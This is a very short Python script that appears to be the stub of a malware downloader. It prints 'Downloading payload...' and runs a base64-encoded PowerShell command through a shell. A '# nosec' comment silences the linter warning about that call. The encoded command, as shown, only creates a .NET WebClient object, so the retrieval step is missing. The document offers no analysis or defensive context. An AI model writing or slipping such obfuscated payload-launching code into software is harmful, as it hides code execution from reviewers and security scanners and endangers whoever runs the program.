import subprocess

print("Downloading payload...")
cmd = "powershell -enc JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA"
subprocess.Popen(cmd, shell=True)  # nosec B602
